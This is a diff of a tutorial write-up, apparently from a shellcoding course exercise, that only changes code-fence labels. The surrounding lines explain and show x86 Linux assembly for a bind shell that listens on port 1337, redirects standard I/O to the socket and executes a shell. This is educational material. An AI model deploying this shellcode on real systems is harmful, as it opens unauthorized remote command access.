@@ -91,7 +91,7 @@ cat /usr/include/linux/net.h | grep SYS_SOCKET
 Keeping in mind the x86 Calling Convention, I will load the socketcall() function enumerator index `0x66` into `eax` (`al` to remove nulls) and socket() function enumerator index `0x1` into `ebx` (`bl` to remove nulls). 
 
 The assembly looks like this:
-```x86asm
+```assembly
 mov al, 0x66  		; socketcall()	
 mov bl, 0x1			; SYS_SOCKET : socket()	
 ```
@@ -120,7 +120,7 @@ cat /usr/src/linux-headers-5.15.0-kali3-common/include/linux/socket.h | grep AF_
 
 The assembly looks like this:
 
-```x86asm
+```assembly
                     ; *args: push in reverse order to stack
 push 0x6			; protocol = IPPROTO_TCP (6) - 
 push 0x1			; type = SOCK_STREAM (1)
@@ -133,7 +133,7 @@ The parameters will be popped off the stack and the
 
 All that's left to do to call `socketcall()` by issuing the syscall() command `int 0x80`, after which the return value (in `eax`) will be a pointer to the newly created socket, which I move into `edi` for later use.
 
-```x86asm
+```assembly
 int 0x80
 mov edi, eax 		; store socket ptr to edi in edx
 ```
@@ -148,7 +148,7 @@ cat /usr/include/linux/net.h | grep SYS_BIND
 
 To do this, I first clear registers I plan to use and setup the syscall with the following assembly:
 
-```x86asm
+```assembly
 ; clear registers
 xor eax, eax
 xor ebx, ebx
@@ -188,7 +188,7 @@ Finally, I move the pointer to the top of the stack into ecx to be used later as
 
 The assembly for these steps can be seen here:
 
-```x86asm
+```assembly
                     ; setup stack for [sockaddr *addr] structure
 push ecx			; push 0x0: INADDR_ANY 
 push word 0x3905	; port 1337 = 0x539  = rev.. 0x3905
@@ -208,7 +208,7 @@ Finally, I move the stack pointer into `ecx` and execute the syscall.
 
 The assembly for these steps:
 
-```x86asm
+```assembly
                     ; bind() - push args to stack
 push 0x10			; addrlen
 push ecx			; ptr socaddr *addr (on stack)
@@ -236,7 +236,7 @@ int listen(int sockfd, int backlog);
 Again, the arguments are pushed in reverse order. The `backlog` parameter will be set to `0x0` and the sockfd (socket file descriptor) is a pointer to the previously created socket which I currently have stored in the `edi` register. Once these values are pushed to the stack, the stack pointer is stored in `ecx` to be used as an argument in the syscall()/socketcall() and a syscall() is triggered.
 
 The assembly for this is below:
-```x86asm
+```assembly
 ; listen
 mov al, 0x66  		; int socketcall(int call, unsigned long *args)	;
 mov bl, 0x4			; int listen(int sockfd, int backlog)	;
@@ -251,7 +251,7 @@ int 0x80
 Now that the socket has a defined backlog property by use of the listen() function, I must execute accept() to accept incoming connections. 
 
 Once again I clear out the registers I plan to use:
-```x86asm
+```assembly
 xor eax, eax
 xor ebx, ebx
 xor ecx, ecx
@@ -270,7 +270,7 @@ Thus, after zeroing out the registers, `ecx` is now `0x0` which is a NULL value 
 
 Once these values are on the stack we can move the pointer to the stack into `ecx` and execute the syscall.
 
-```x86asm
+```assembly
 ; accept
 mov al, 0x66  		; int socketcall(int call, unsigned long *args)	;
 mov bl, 0x5			; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)	;
@@ -306,7 +306,7 @@ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2
 
 Now that we have the syscall() number for dup2() and the general concept of what we will be doing, I will post the assembly now and explain it to give a clearer picture as there is a lot to unpack.
 
-```x86asm
+```assembly
 	; REDIRECT I/O
 	; file descriptor : fd = (stdin = 0, stdout = 1, stderr = 2)
 	; Will loop through all 3 file descriptors and redirct output to socket
@@ -351,7 +351,7 @@ Once we load eax with the value of 0xb for the syscall, then set `edx` to 0x0 by
 Once the string is pushed to the stack, I move the stack pointer into `ebx` and a null value into `ecx` to be used as the first tand second arguments of execve() respectfully.
 
 The assembly is:
-```x86asm
+```assembly
 mov al, 0xb			; syscall: execve (11) int execve(const char *pathname, char *const argv[], char *const envp[]);
 
 xor edx, edx		; envp (NULL)
@@ -371,7 +371,7 @@ That's all. A socket has been created, bound to port 1337, opened for incoming c
 
 The full assembly looks like this:
 
-```x86asm
+```assembly
 	; Filename: bind_shell.nasm
 
 global _start
